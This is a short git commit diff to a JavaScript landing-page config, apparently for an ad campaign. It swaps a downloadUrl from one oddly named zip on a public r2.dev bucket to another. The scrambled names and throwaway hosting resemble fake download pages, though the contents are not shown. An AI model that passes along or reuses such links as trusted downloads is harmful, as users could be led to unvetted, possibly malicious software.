bd2a31e4415678c37d6a3c70fbe2f0c21270be45
aa168188aaaa <lisiajlekjw@gmail.com>
2025-05-15 21:07:48 +0800

    Update xhs03bsem.js

--- static/js/xhs03bsem.js
+++ static/js/xhs03bsem.js
@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/TXOS_Iraasellrtys_osvderos_275.zip", 
+    downloadUrl: "https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/Sioppcyyb-xp.win11_stuep56822.124.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
